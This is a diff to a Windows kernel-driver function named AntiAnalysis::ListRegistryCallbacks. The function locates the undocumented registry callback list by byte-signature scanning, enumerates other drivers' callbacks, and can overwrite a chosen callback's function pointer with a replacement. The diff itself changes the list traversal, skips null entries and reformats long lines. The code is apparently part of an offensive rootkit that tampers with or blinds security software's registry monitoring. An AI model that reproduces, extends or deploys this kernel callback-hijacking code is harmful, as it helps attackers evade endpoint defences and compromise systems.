@@ -302,6 +302,7 @@ NTSTATUS AntiAnalysis::ListRegistryCallbacks(CmCallbacksList* Callbacks, ULONG64
 	PCM_CALLBACK currentCallback = NULL;
 	ULONG foundIndex = 0;
 	CHAR driverName[MAX_DRIVER_PATH] = { 0 };
+	ULONG callbacksIndex = 0;
 	errno_t err = 0;
 
 	// Find CmpRegisterCallbackInternal.
@@ -316,7 +317,8 @@ NTSTATUS AntiAnalysis::ListRegistryCallbacks(CmCallbacksList* Callbacks, ULONG64
 		return STATUS_NOT_FOUND;
 
 	// Find the function that holds the valuable information: CmpInsertCallbackInListByAltitude.
-	searchedRoutineAddress = (PUCHAR)searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex + CallFunctionOffset;
+	searchedRoutineAddress = (PUCHAR)searchedRoutineAddress + *(searchedRoutineOffset) + foundIndex + 
+		CallFunctionOffset;
 	targetFunctionSigLen = sizeof(CmpInsertCallbackInListByAltitudeSignature);
 	targetFunctionDistance = CmpInsertCallbackInListByAltitudeSignatureDistance;
 
@@ -327,7 +329,8 @@ NTSTATUS AntiAnalysis::ListRegistryCallbacks(CmCallbacksList* Callbacks, ULONG64
 	if (!searchedRoutineOffset)
 		return STATUS_NOT_FOUND;
 
-	searchedRoutineAddress = (PUCHAR)searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex + CmpInsertCallbackInListByAltitudeOffset;
+	searchedRoutineAddress = (PUCHAR)searchedRoutineAddress + *(searchedRoutineOffset) + foundIndex + 
+		CmpInsertCallbackInListByAltitudeOffset;
 
 	// Get CallbackListHead and CmpCallBackCount.
 	SIZE_T listHeadSignatureLen = sizeof(CallbackListHeadSignature);
@@ -339,39 +342,45 @@ NTSTATUS AntiAnalysis::ListRegistryCallbacks(CmCallbacksList* Callbacks, ULONG64
 	if (!searchedRoutineOffset)
 		return STATUS_NOT_FOUND;
 
-	PUCHAR callbacksList = (PUCHAR)searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex + RoutinesListOffset;
+	PUCHAR callbacksList = (PUCHAR)searchedRoutineAddress + *(searchedRoutineOffset) + foundIndex + RoutinesListOffset;
 	searchedRoutineOffset = (PLONG)FindPattern((PCUCHAR)&RoutinesListCountSignature, 0xCC, listHeadCountSignatureLen - 1,
 		searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(listHeadCountSignatureLen - 1));
 
 	if (!searchedRoutineOffset)
 		return STATUS_NOT_FOUND;
 
-	ULONG callbacksListCount = *(PLONG)((PUCHAR)searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex + CallbacksListCountOffset);
+	ULONG callbacksListCount = *(PLONG)((PUCHAR)searchedRoutineAddress + *(searchedRoutineOffset) + foundIndex + 
+		CallbacksListCountOffset);
 
 	// Get CmpCallbackListLock.
 	SIZE_T callbacksListLockSignatureLen = sizeof(CmpCallbackListLockSignature);
 	searchedRoutineOffset = (PLONG)FindPattern((PCUCHAR)&CmpCallbackListLockSignature, 0xCC,
-		callbacksListLockSignatureLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex,
-		(ULONG)(callbacksListLockSignatureLen - 1));
+		callbacksListLockSignatureLen, searchedRoutineAddress, targetFunctionDistance, &foundIndex,
+		(ULONG)(callbacksListLockSignatureLen));
 
 	if (!searchedRoutineOffset)
 		return STATUS_NOT_FOUND;
 
-	ULONG_PTR callbackListLock = (ULONG_PTR)((PUCHAR)searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex + CmpCallbackListLockOffset);
+	ULONG_PTR callbackListLock = (ULONG_PTR)((PUCHAR)searchedRoutineAddress + *(searchedRoutineOffset) + foundIndex + 
+		CmpCallbackListLockOffset);
 	ExAcquirePushLockExclusiveEx(&callbackListLock, 0);
 	currentCallback = (PCM_CALLBACK)callbacksList;
 
-	for (ULONG i = 0; i < callbacksListCount; i++) {
+	do {
 		if (ReplacedFunction && ReplacerFunction) {
 			if (currentCallback->Function == ReplacedFunction)
 				currentCallback->Function = ReplacerFunction;
 		}
 		else {
-			Callbacks->Callbacks[i].CallbackAddress = (ULONG64)currentCallback->Function;
-			Callbacks->Callbacks[i].Context = currentCallback->Context;
+			if ((ULONG64)currentCallback->Function == 0) {
+				currentCallback = (PCM_CALLBACK)currentCallback->List.Flink;
+				continue;
+			}
+			Callbacks->Callbacks[callbacksIndex].CallbackAddress = (ULONG64)currentCallback->Function;
+			Callbacks->Callbacks[callbacksIndex].Context = currentCallback->Context;
 
-			if (NT_SUCCESS(MatchCallback((PVOID)Callbacks->Callbacks[i].CallbackAddress, driverName))) {
-				err = strcpy_s(Callbacks->Callbacks[i].DriverName, driverName);
+			if (NT_SUCCESS(MatchCallback((PVOID)Callbacks->Callbacks[callbacksIndex].CallbackAddress, driverName))) {
+				err = strcpy_s(Callbacks->Callbacks[callbacksIndex].DriverName, driverName);
 
 				if (err != 0) {
 					status = STATUS_ABANDONED;
@@ -379,8 +388,10 @@ NTSTATUS AntiAnalysis::ListRegistryCallbacks(CmCallbacksList* Callbacks, ULONG64
 				}
 			}
 		}
+
+		callbacksIndex++;
 		currentCallback = (PCM_CALLBACK)currentCallback->List.Flink;
-	}
+	} while ((PVOID)currentCallback != (PVOID)callbacksList);
 	ExReleasePushLockExclusiveEx(&callbackListLock, 0);
 
 	if (ReplacedFunction == 0 && ReplacerFunction == 0)
